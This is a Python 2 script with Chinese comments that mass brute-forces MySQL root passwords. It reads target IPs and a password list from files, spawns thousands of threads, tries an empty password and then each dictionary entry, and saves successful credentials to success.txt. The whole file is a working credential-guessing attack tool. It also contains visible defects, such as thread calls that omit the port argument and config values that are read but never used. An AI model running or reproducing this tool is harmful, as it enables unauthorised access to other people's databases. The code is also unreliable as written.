#coding=utf-8
import pymysql
import threading
import time
import ConfigParser

cfg = ConfigParser.ConfigParser()
cfg.read('Config.ini')
user = cfg.get("Config", "user")
thread_s = cfg.get("Config","threads")
port = cfg.get("Config","port")

def pymysql_connect(ip, mysql_password,event,port):
    event1=event
    try:
        event1.clear()
        pymysql.connect(ip, mysql_user, mysql_password, '' , port)
        event1.clear()
        print ip + ":" + mysql_password + "  connected"
        success(ip + ':' + mysql_user + '|' + mysql_password + '\n')

    except Exception,e:
        e = str(e)
        print e
        if (e.find('Access denied') != -1):
            # 端口开放，但密码错误，记录并继续下面的爆破代码
            event1.set() #设置爆破标志
            #print ip + ":" + mysql_password + "  密码错误"
            ip_log('端口开放_密码错误.txt', ip, "密码错误")
            pass
        elif (e.find('many connections') != -1):
            # 连接过多,暂停1秒
            time.sleep(1)
            event1.set()
            pass
        elif (e.find('Can\'t connect') != -1):
            # 端口未开放,退出
            event1.clear()
        else:
            # 其他错误，记录并退出
            event1.clear()
            ip_log('log.txt', ip, e)
        return

#爆破函数
def mysql_connect2(ip):

    # 先尝试空密码连接threading.Event()
    event1 = threading.Event()
    t2 = threading.Thread(target=pymysql_connect, args=(ip, '',event1))
    t2.start()
    t2.join(3) #3秒超时

    if not event1.isSet():
       #未设置标识则退出
        return

    ip_log('log.txt', ip, "密码错误")

    # 开始爆破
    global list_password
    for mysql_password in list_password:
        mysql_password = mysql_password.replace('\r', "").replace('\n', "")
        t2 = threading.Thread(target=pymysql_connect, args=(ip, mysql_password, event1))
        t2.start()
        t2.join(5)  # 秒超时
        if not event1.isSet():
            # 未设置标识则退出,不然就继续爆破
            return
    return

def success(x):
    with open('success.txt','a+')as a:
        a.write(x + "\n")


def ip_log(txt_name,ip,content):
    with open(txt_name,'a+')as a:
        a.write(ip + ":" + content + "\r\n")


if __name__ == "__main__":

    #设置数据库用户名
    mysql_user='root'

    #设置同时运行的线程数
    threads=10000

    #指定IP网段

    #将密码字典读进列表
    list_password= list(set([x.strip() for x in open('password.txt','r').readlines()]))
    ip1 = list(set([x.strip() for x in open('ip.txt','r').readlines()]))
    for ip in ip1:    
        ip=str(ip)
        print 'scan : ' + ip

        #限制同时运行的线程数
        while (threading.activeCount() > threads):
            time.sleep(1)

        t1 = threading.Thread(target=mysql_connect2, args=(ip,))
        t1.start()


    while(threading.activeCount()!=1):
        # 当线程只剩1时，说明执行完了
        time.sleep(1)
    print "检测结束"
